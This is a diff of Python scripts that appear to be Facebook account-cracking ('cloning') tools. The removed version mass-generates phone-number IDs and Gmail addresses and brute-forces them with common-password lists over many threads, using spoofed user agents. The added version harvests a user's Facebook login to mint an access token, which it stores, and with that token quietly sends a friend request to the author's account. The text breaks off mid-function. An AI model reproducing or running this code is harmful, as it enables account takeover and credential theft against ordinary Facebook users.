@@ -1,1586 +1,2129 @@
-fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
+#Decompiled by MR.K7C8NG
+import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
+from multiprocessing.pool import ThreadPool
 
-try:
-	import os,requests,json,time,re,random,sys,uuid,string,subprocess
-	from string import *
-	import bs4
-	#import dz
-	from concurrent.futures import ThreadPoolExecutor as tred
-	from bs4 import BeautifulSoup as sop
-	from bs4 import BeautifulSoup
-except ModuleNotFoundError: 
-	print('\n Installing missing modules ...')
-	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python trt.py')
-	
-print('[•] Follow My Account')
-os.system('xdg-open https://www.facebook.com/BILAL.AHMAD.404?mibextid=ZbWKwL')
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
-android_models=[]
-try:
-	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
-	for line in xx:
-		android_models.append(line)
-except:pass
+def keluar():
+    print '\x1b[1;91m[!] Keluar'
+    os.sys.exit()
 
-usr=[]
-try:
-	xd=requests.get('https://raw.githubusercontent.com/SHaYanxALyan/SA/main/sk.txt').text.splitlines()
-	for us in xd:
-		usr.append(us)
-except: pass
 
-gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
-ugen=[]
-for xd in range(10000):
-	aa='Mozilla/5.0 (Linux; U; Android'
-	b=random.choice(['6','7','8','9','10','11','12','13'])
-	c=f' en-us; {str(gt)}'
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile Safari/537.36'
-	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
-	ugen.append(uaku2)
-for agent in range(10000):
-	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-	b=random.choice(['6','7','8','9','10','11','12','13'])
-	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile Safari/533.1'
-	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-	ugen.append(fullagnt)
-rug=[]
-for nt in range(10000):
-	rr=random.randint
-	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	rx=random.randrange(1, 999)
-	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
-	rug.append(xx)
-ruz=[]
-for mtc in range(10000):
-	rr=random.randint
-	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
-	ruz.append(xd)
-	
-#new ua
-ugen=[]
-for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/533.1'
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.01)
 
-sim_id = ''
-android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
-model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
-build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
-fblc = 'en_GB'
-try:
-        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
-except:
-        fbcr = 'Zong'
-fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
-fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
-fbdv = model
-fbsv = android_version
-fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
-fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
-try:
-        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
-        total = 0
-        for i in fbcr:
-                total+=1
-        select = ('1','2')
-        if select == '1':
-                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
-                sim_id+=fbcr
-        elif select == '2':
-                try:
-                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
-                        sim_id+=fbcr
-                except Exception as e:
-                        fbcr = "Zong"
-                        sim_id+=fbcr
+
+logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mMR.K7C8NG\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mInDoNeSiA CYBER ErRoR SyStEm\x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96mGUNAKAN DENGAN BIJAK \x1b[1;97m/ \x1b[1;96mMR.K7C8NG\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/pashayogi\x1b[0m\n[*] Decompiled by MR.K7C8NG\n'
+
+def tik():
+    titik = [
+     '.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mSedang Masuk COK \x1b[1;97m' + o,
+        sys.stdout.flush()
+        time.sleep(1)
+
+
+back = 0
+threads = []
+berhasil = []
+cekpoint = []
+gagal = []
+idteman = []
+idfromteman = []
+idmem = []
+id = []
+em = []
+emfromteman = []
+hp = []
+hpfromteman = []
+reaksi = []
+reaksigrup = []
+komen = []
+komengrup = []
+listgrup = []
+vulnot = '\x1b[31mNot Vuln'
+vuln = '\x1b[32mVuln'
+
+
+def login():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r')
+        menu()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK AKUN FB \x1b[1;91m[\xe2\x98\x86]'
+        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername FB \x1b[1;91m:\x1b[1;92m ')
+        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
+        tik()
+        try:
+            br.open('https://m.facebook.com')
+        except mechanize.URLError:
+            print '\n\x1b[1;91m[!] Tidak ada koneksi'
+            keluar()
+
+        br._factory.is_html = True
+        br.select_form(nr=0)
+        br.form['email'] = id
+        br.form['pass'] = pwd
+        br.submit()
+        url = br.geturl()
+        if 'save-device' in url:
+            try:
+                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
+                x = hashlib.new('md5')
+                x.update(sig)
+                a = x.hexdigest()
+                data.update({'sig': a})
+                url = 'https://api.facebook.com/restserver.php'
+                r = requests.get(url, params=data)
+                z = json.loads(r.text)
+                zedd = open('login.txt', 'w')
+                zedd.write(z['access_token'])
+                zedd.close()
+                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
+                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
+                os.system('xdg-open https://youtube.com/NjankSoekamti')
+                time.sleep(2)
+                menu()
+            except requests.exceptions.ConnectionError:
+                print '\n\x1b[1;91m[!] Tidak ada koneksi'
+                keluar()
+
+        if 'checkpoint' in url:
+            print '\n\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            keluar()
         else:
-                fbcr = 'Zong'
-                sim_id+=fbcr
-except:
-        fbcr = "Zong"
-device = {
-        'android_version':android_version,
-        'model':model,
-        'build':build,
-        'fblc':fblc,
-        'fbmf':fbmf,
-        'fbbd':fbbd,
-        'fbdv':model,
-        'fbsv':fbsv,
-        'fbca':fbca,
-        'fbdm':fbdm}
+            print '\n\x1b[1;91m[!] Login Gagal'
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            login()
 
-logo=("""\033[1;91m
- /____ _____ _               _      
- |  _ \_   _| |        /\   | |     
- | |_) || | | |       /  \  | |     
- |  _ < | | | |      / /\ \ | |     
- | |_) || |_| |____ / ____ \| |____ 
- |____/_____|______/_/    \_\______|
-\033[1;37m--------------------------------------------------
-[~] Author   : BILAL AHMAD
-[~] Facebook : BILAL AHMAD404
-[~] Tool     : FRRR
-[~] Version  : 30.0
-\033[1;37m----------------------------------------------""")
-def linex():
-	print('\033[1;37m----------------------------------------------')
-def clear():
-	os.system('clear')
-	print(logo)
-A = '\x1b[1;97m' 
-B = '\x1b[1;96m' 
-C = '\x1b[1;91m' 
-D = '\x1b[1;92m'
-M = '\033[1;31m'
-H = '\033[1;32m'
-N = '\x1b[1;37m'	
-E = '\x1b[1;93m' 
-F = '\x1b[1;94m'
-G = '\x1b[1;95m'
-P = '\033[1;37m'
-def cek_apk(session,coki):
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
-	else:
-		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
-		for i in range(len(game)):
-			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
-	else:
-		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
-		for i in range(len(game)):
-			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
-loop=0
-oks=[]
-cps=[]
-pcp=[]
-id=[]
-tokenku=[]
 
 def menu():
-			clear()
-		#	linex()
-			print(' [1] File cloning\n [2] Random cloning\n [3] gmail cloning \n [4] Contact on whatsapp \n [0] Exit menu')
-			linex()
-			xd=input(' Choose an option: ')
-			if xd in ['1','01']:
-				clear()
-				print(' Put file example:  /sdcard/File.txt  etc..')
-				linex()
-				file = input(' Put file path\033[1;37m: ')
-				try:
-					fo = open(file,'r').read().splitlines()
-				except FileNotFoundError:
-					print(' File location not found ')
-					time.sleep(1)
-					menu()
-				clear()
-				print(' All method working ')
-				linex()
-				print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;33m [2] \033[1;37mMethod  (for mix ids) \033[1;32m  (best)  \n\033[1;33m [3]\033[1;37m Method  (with cokies)\033[1;32m   (v.fast) \n\033[1;33m [4]\033[1;37m Method  (for new ids)\033[1;32m   (best) \n \033[1;33m[5] \033[1;37mMethod  (for new ids) \033[1;32m  (slow) \n \033[1;33m[6] \033[1;37mMethod  (for new ids) \n \033[1;33m[7] \033[1;37mMethod  (for new ids) \n \033[1;33m[8] \033[1;37mMethod  (for new ids) ')
-				linex()
-				mthd=input(' Choose: ')
-				linex()
-				plist = []
-				try:
-					ps_limit = int(input(' How many passwords do you want to add ? '))
-				except:
-					ps_limit =1
-				clear()
-				print('\033[1;32m exp: first last,firtslast,first123')
-				linex()
-				for i in range(ps_limit):
-					plist.append(input(f' Put password {i+1}: '))
-				clear()
-				print(' Do you went show cp account? (y/n): ')
-				linex()
-				cx=input(' Choose: ')
-				if cx in ['y','Y','yes','Yes','1']:
-					pcp.append('y')
-				else:
-					pcp.append('n')
-				with tred(max_workers=30) as crack_submit:
-					clear()
-					total_ids = str(len(fo))
-					print(' Total account ids : \033[1;32m'+total_ids+f' ')
-					print(' \033[1;37mThe process is running in the background')
-					linex()
-					for user in fo:
-						ids,names = user.split('|')
-						passlist = plist
-						if mthd in ['1','01']:
-							crack_submit.submit(api1,ids,names,passlist)
-						elif mthd in ['2','02']:
-							crack_submit.submit(api2,ids,names,passlist)
-						elif mthd in ['3','03']:
-							crack_submit.submit(api3,ids,names,passlist)
-						elif mthd in ['4','04']:
-							crack_submit.submit(api4,ids,names,passlist)
-						elif mthd in ['5','05']:
-							crack_submit.submit(api5,ids,names,passlist)
-						elif mthd in ['6','06']:
-							crack_submit.submit(api6,ids,names,passlist)
-						elif mthd in ['7','07']:
-							crack_submit.submit(api7,ids,names,passlist)
-						elif mthd in ['8','08']:
-							crack_submit.submit(api8,ids,names,passlist)
-				print('\033[1;37m')
-				linex()
-				print(' The process has completed')
-				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-				linex()
-				input(' Press enter to back ')
-				os.system('python trt.py')
-			elif xd in ['2','02']:
-				pak()
-			elif xd in ['3','03']:
-				gmail()
-				#create()
-				#dz._login()
-				exit()
-			elif xd in ['4','04']:
-				os.system('xdg-open https://chat.whatsapp.com/DX4hUHdAdkH8TdfBlKSwIu')
-				menu()
-			elif xd in ['0','00']:
-				exit(' Thanks for use 🥰 ')
-			else:
-				exit(' Option not found in menu...')
-		
-def pak():
-		user=[]
-		clear()
-		print('\033[1;35m Code example: 0306,0315,0335,0345')
-		code = input('\033[1;37m put code: ')
-		try:
-			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
-		except ValueError:
-			limit = 5000
-		clear()
-		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (v-fast)  \033[1;32m \n [3] \033[1;33mMethod   (v-best)  \033[1;32m \n [4] \033[1;33mMethod   (with cokies) \033[1;32m \n [5] \033[1;33mMethod   (slow)  \033[1;32m \n [6] \033[1;33mMethod   (slow) ')
-		linex()
-		mthd = input(' Choose: ')
-		clear()
-		print('\033[1;32m [1] \033[1;33mClone with 7+11 digit pass (v-fast) \n\033[1;32m [2]\033[1;33m Clone with auto pass (best) \n\033[1;32m [3]\033[1;33m Clone with auto pass (fast)\n\033[1;32m [5] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [5] \033[1;33mClone with auto pass (slow-fast) \n\033[1;32m [6] \033[1;33mClone with auto pass (slow-best) \n\033[1;32m [7] \033[1;33mClone with auto pass (only-BD) \n\033[1;32m [8] \033[1;33mClone with auto pass (only-AFG) ')
-		linex()
-		pcs = input(' [?] Select: ')
-		for nmbr in range(limit):
-			nmp = ''.join(random.choice(string.digits) for _ in range(7))
-			user.append(nmp)
-		with tred(max_workers=30) as SK:	
-			clear()
-			tl = str(len(user))
-			print(' Total ids : \033[1;32m'+tl+f' ')
-			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
-			print(' \033[1;37mThe process is running in the background')
-			linex()
-			for psx in user:
-				ids = code+psx
-				if pcs in ['1','01']:
-					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
-				if pcs in ['2','02']:
-					passlist = [psx,ids,'khankhan','khan1122','ali12345','pakistan','khan12345','ali1122','baloch12345','khan','baloch','khan','pubg','pubg1122','malik786']
-				elif pcs in ['3','03']:
-					passlist = [psx,ids,'pubg','pubg1122','pubgking','pubg12','pubg123','pubg1234']
-				elif pcs in ['4','04']:
-					passlist = [psx,ids,'khankhan','khan1122','khan1234','khan123']
-				elif pcs in ['5','05']:
-					passlist = [psx,ids]
-				elif pcs in ['6','06']:
-					passlist = [psx,ids,'khankhan','khan1122','786786','ali786','khan123','khan12','pakistan','ali123','khanbaba']
-				elif pcs in ['7','07']:
-					passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
-				elif pcs in ['8','08']:
-					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
-				if mthd in ['1','01']:
-					SK.submit(trt1,ids,passlist)
-				if mthd in ['2','02']:
-					SK.submit(trt2,ids,passlist)
-				if mthd in ['3','03']:
-					SK.submit(trt3,ids,passlist)
-				if mthd in ['4','04']:
-					SK.submit(trt4,ids,passlist)
-				if mthd in ['5','05']:
-					SK.submit(trt5,ids,passlist)
-				if mthd in ['6','06']:
-					SK.submit(trt6,ids,passlist)
-		print('\033[1;37m')
-		linex()
-		print(' The process has completed')
-		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-		linex()
-		input(' Press enter to back ')
-		os.system('python trt.py')
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        os.system('clear')
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+            a = json.loads(otw.text)
+            nama = a['name']
+            id = a['id']
+        except KeyError:
+            os.system('clear')
+            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            login()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[!] Tidak ada koneksi'
+            keluar()
 
-def gmail():
-		os.system('rm -rf .re.txt')
-		clear()
-		print('\033[1;37m example: ramzan, ali, sajjad, faizan\033[1;97m')
-		linex()
-		first = input(' Put first name: ')
-		linex()
-		print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
-		linex()
-		last = input(' Put last name: ')
-		linex()
-		print(' Example: @gmail.com ')
-		linex()
-		domain = input(' domain: ')
-		linex()
-		try:
-			limit=int(input(' Put limit: '))
-		except ValueError:
-			limit = 5000
-		clear()
-		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
-		linex()
-		pxc = input(' Choose : ')
-		clear()
-		print('\033[1;32m [1] \033[1;33mMethod   (best) \033[1;32m \n [2] \033[1;33mMethod   (v-fast)  \033[1;32m \n [3] \033[1;33mMethod   (v-best)  \033[1;32m \n [4] \033[1;33mMethod   (slow) \033[1;32m \n [5] \033[1;33mMethod   (slow)  \033[1;32m \n [6] \033[1;33mMethod   (slow) ')
-		linex()
-		mthd = input(' Choose: ')
-		linex()
-		print(' Getting gmails...')
-		lists = ['3','4']
-		for xd in range(limit):
-			lchoice = random.choice(lists)
-			if '3' in lchoice:
-				mail = ''.join(random.choice(string.digits) for _ in range(3))
-				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-			else:
-				mail = ''.join(random.choice(string.digits) for _ in range(4))
-				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-			fo = open('.re.txt', 'r').read().splitlines()
-		with tred(max_workers=30) as SK:
-			total = str(len(fo))
-			clear()
-			print(' Total ids : \033[1;32m'+total+f' ')
-			print(' \033[1;37mThe process is running in the background')
-			linex()
-			for user in fo:
-				ids,names = user.split('|')
-				first_name = names.rsplit(' ')[0]
-				try:
-					last_name = names.rsplit(' ')[1]
-				except IndexError:
-					last_name = 'Khan'
-				fs = first_name.lower()
-				ls = last_name.lower()
-				if pxc in ['1','01']:
-					passlist = [fs+ls,fs+' '+ls,fs]
-				elif pxc in ['2','02']:
-					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
-				elif pxc in ['3','03']:
-					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
-				else:
-					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
-				if mthd in ['1','01']:
